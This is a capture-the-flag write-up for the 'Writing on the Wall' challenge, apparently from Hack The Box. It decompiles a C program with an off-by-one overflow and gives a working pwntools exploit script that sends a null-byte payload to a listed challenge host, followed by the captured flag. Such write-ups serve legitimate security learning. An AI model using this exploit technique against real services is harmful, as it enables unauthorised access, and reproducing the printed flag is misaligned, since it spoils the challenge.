# Writing on the Wall

As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door's secrets?

## Writeup

The main function of the code is this:

```c
undefined8 main(void)

{
  int check;
  long in_FS_OFFSET;
  char buffer [6];
  undefined8 target;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  target = 0x2073736170743377;
  read(0,buffer,7);
  check = strcmp(buffer,(char *)&target);
  if (check == 0) {
    open_door();
  }
  else {
    error("You activated the alarm! Troops are coming your way, RUN!\n");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

We need to set the **buffer** and the **target** equal, but our buffer is only of **6** chars and the target is long **8** chars.

The overflow is of **one** only byte, so we can send **\0** to terminate the string and make it equal.

This will be our payload:

```
\0AAAAA\0
```

The final exploit will be:

```python
#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'writing_on_the_wall')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
if args['LOCAL']:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False) # Can be found via $ ldd exe
else:
    libc = ELF('glibc/libc.so.6', checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '94.237.53.26'
port = int(args.PORT or 41230)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

payload = b'\0AAAAA\0'

io.sendlineafter(b'>>', payload)

io.interactive()
```

The flag is:

```
You managed to open the door! Here is the password for the next one: HTB{3v3ryth1ng_15_r34d4bl3}
```